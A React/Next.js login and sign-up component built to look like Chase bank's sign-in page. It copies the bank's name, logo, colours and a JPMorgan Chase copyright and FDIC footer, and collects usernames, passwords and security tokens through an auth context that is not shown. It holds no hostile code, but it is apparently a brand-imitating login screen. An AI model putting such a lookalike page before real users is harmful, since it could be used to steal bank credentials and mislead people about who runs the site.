"use client"

import { useEffect, useState } from "react"
import Image from "next/image"
import Link from "next/link"
import { Eye, EyeOff, Fingerprint, Loader2, MoreHorizontal, ShieldCheck, X } from "lucide-react"
import { useAuth } from "@/lib/auth-context"

export function AuthForm({ mode }: { mode: "sign-in" | "sign-up" }) {
  const { login, register } = useAuth()
  const isSignUp = mode === "sign-up"
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [name, setName] = useState("")
  const [email, setEmail] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [remember, setRemember] = useState(true)
  const [useToken, setUseToken] = useState(false)
  const [token, setToken] = useState("")
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [notice, setNotice] = useState<"forgot" | "privacy" | "more" | null>(null)

  useEffect(() => {
    const saved = window.localStorage.getItem("chase_username")
    if (saved && !isSignUp) setUsername(saved)
  }, [isSignUp])

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault()
    setError(null)
    if (useToken && token.trim().length < 6) {
      setError("Enter the 6-digit token from your security device.")
      return
    }
    setLoading(true)
    try {
      if (isSignUp) {
        const [firstName, ...last] = name.trim().split(/\s+/)
        await register({ username: username.trim(), email: email.trim(), password, firstName: firstName || "", lastName: last.join(" "), phone: "", ssn: "", dateOfBirth: "", address: "", city: "", state: "", zipCode: "" })
      } else {
        await login(username.trim(), password, useToken ? token : undefined)
        if (remember) window.localStorage.setItem("chase_username", username.trim())
        else window.localStorage.removeItem("chase_username")
      }
      window.location.replace("/")
    } catch (cause) {
      setError(cause instanceof Error ? cause.message : "We couldn't sign you in. Check your details and try again.")
    } finally {
      setLoading(false)
    }
  }

  return (
    <main className="min-h-svh overflow-y-auto bg-[#0868b8] text-[#172033]">
      <div className="mx-auto flex min-h-svh w-full max-w-6xl flex-col px-5 pb-6 sm:px-10">
        <header className="flex items-center justify-between py-4 text-white">
          <div className="flex items-center gap-2 text-sm font-medium"><ShieldCheck className="size-5" /> Secure sign in</div>
        </header>
        <div className="flex flex-1 flex-col items-center justify-center gap-7 py-6 sm:gap-9 sm:py-8">
          <div className="flex items-center gap-2 text-white" aria-label="Chase">
            <span className="font-mono text-3xl font-semibold tracking-[0.08em] sm:text-4xl">CHASE</span>
            <Image src="/images/chase-logo.png" alt="Chase logo" width={44} height={44} className="shrink-0 sm:h-[52px] sm:w-[52px]" priority />
          </div>
          <section className="w-full max-w-xl rounded-md border border-[#aeb4bb] bg-white shadow-[0_3px_12px_rgba(0,0,0,.22)]">
            <div className="p-6 sm:p-9">
              <h1 className="text-2xl font-normal text-[#172033]">{isSignUp ? "Create your account" : "Sign in to Chase"}</h1>
              <p className="mt-2 text-sm text-[#52606d]">{isSignUp ? "Start managing your money securely." : "Enter your username and password to continue."}</p>
              <form onSubmit={handleSubmit} className="mt-7 flex flex-col gap-5">
                {isSignUp && <label className="flex flex-col gap-2 text-sm font-medium">Full name<input className="border-b-2 border-[#8a8f94] px-1 py-3 text-lg outline-none focus:border-[#0868b8]" value={name} onChange={(e) => setName(e.target.value)} required autoComplete="name" /></label>}
                {isSignUp && <label className="flex flex-col gap-2 text-sm font-medium">Email address<input className="border-b-2 border-[#8a8f94] px-1 py-3 text-lg outline-none focus:border-[#0868b8]" type="email" value={email} onChange={(e) => setEmail(e.target.value)} required autoComplete="email" /></label>}
                <label className="flex flex-col gap-2 text-lg text-[#39434d]">{isSignUp ? "Choose a username" : "Enter your username"}<span className="flex items-center border-b-2 border-[#8a8f94] focus-within:border-[#0868b8]"><input className="min-w-0 flex-1 px-1 py-3 outline-none" value={username} onChange={(e) => setUsername(e.target.value)} required autoComplete="username" /><Fingerprint className="mr-1 size-7 text-[#064b7c]" aria-hidden="true" /></span></label>
                <label className="flex flex-col gap-2 text-lg text-[#39434d]">{isSignUp ? "Create a password" : "Enter your password"}<span className="flex items-center border-b-2 border-[#8a8f94] focus-within:border-[#0868b8]"><input className="min-w-0 flex-1 px-1 py-3 outline-none" type={showPassword ? "text" : "password"} value={password} onChange={(e) => setPassword(e.target.value)} required minLength={isSignUp ? 8 : undefined} autoComplete={isSignUp ? "new-password" : "current-password"} /><button type="button" className="px-1 font-semibold text-[#064b7c] underline" onClick={() => setShowPassword((value) => !value)} aria-label={showPassword ? "Hide password" : "Show password"}>{showPassword ? <EyeOff className="size-6" /> : "Show"}</button></span></label>
                {!isSignUp && <div className="flex flex-wrap gap-6 text-lg"><label className="flex items-center gap-3"><input type="checkbox" className="size-6 accent-[#0868b8]" checked={remember} onChange={(e) => setRemember(e.target.checked)} /> Remember me</label><label className="flex items-center gap-3"><input type="checkbox" className="size-6 accent-[#0868b8]" checked={useToken} onChange={(e) => setUseToken(e.target.checked)} /> Use token</label></div>}
                {useToken && <input className="border-b-2 border-[#8a8f94] px-1 py-3 text-lg outline-none focus:border-[#0868b8]" inputMode="numeric" maxLength={6} placeholder="Enter 6-digit token" value={token} onChange={(e) => setToken(e.target.value.replace(/\D/g, ""))} aria-label="Security token" />}
                {error && <p className="rounded-sm bg-red-50 px-3 py-2 text-sm text-red-700" role="alert">{error}</p>}
                <button type="submit" disabled={loading} className="flex min-h-14 items-center justify-center rounded-md bg-[#0868b8] px-4 text-xl font-semibold text-white transition hover:bg-[#07599d] disabled:cursor-not-allowed disabled:opacity-70">{loading ? <Loader2 className="size-6 animate-spin" /> : isSignUp ? "Create account" : "Sign in"}</button>
              </form>
              {!isSignUp && <button type="button" onClick={() => setNotice("forgot")} className="mt-7 w-full text-lg font-semibold text-[#064b7c] underline underline-offset-4">Forgot username or password?</button>}
            </div>
            <div className="flex flex-wrap justify-center gap-x-5 gap-y-2 border-t border-[#d4d7da] px-6 py-5 text-sm text-[#064b7c] sm:text-base"><Link href={isSignUp ? "/sign-in" : "/sign-up"} className="underline underline-offset-4">{isSignUp ? "Already have an account? Sign in" : "Sign up"}</Link>{!isSignUp && <><Link href="/open-account" className="underline underline-offset-4">Open an account</Link><button type="button" onClick={() => setNotice("privacy")} className="underline underline-offset-4">Privacy</button><button type="button" onClick={() => setNotice("more")} aria-label="More sign-in options"><MoreHorizontal className="size-5" /></button></>}</div>
          </section>
        </div>
        <footer className="text-center text-sm leading-6 text-white/90">Equal Housing Opportunity<br />Deposit products provided by JPMorgan Chase Bank, N.A. Member FDIC<br />© 2026 JPMorgan Chase &amp; Co.</footer>
      </div>
      {notice && <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/45 p-5" role="dialog" aria-modal="true" aria-label="Sign-in information"><div className="w-full max-w-md rounded-md bg-white p-6 shadow-xl"><div className="flex items-center justify-between"><h2 className="text-xl font-semibold">{notice === "forgot" ? "Need help signing in?" : notice === "privacy" ? "Privacy and security" : "More sign-in options"}</h2><button type="button" onClick={() => setNotice(null)} aria-label="Close"><X /></button></div><p className="mt-4 text-sm leading-6 text-[#52606d]">{notice === "forgot" ? "For your security, we do not display account credentials here. Visit our secure recovery center or contact Chase support to reset your username or password." : notice === "privacy" ? "Your information is protected with encryption and industry-standard security controls. Review the privacy notice before continuing." : "You can sign in with a security token, use the Chase mobile app, or open a new account."}</p><button type="button" onClick={() => setNotice(null)} className="mt-6 w-full rounded-md bg-[#0868b8] py-3 font-semibold text-white">Close</button></div></div>}
    </main>
  )
}
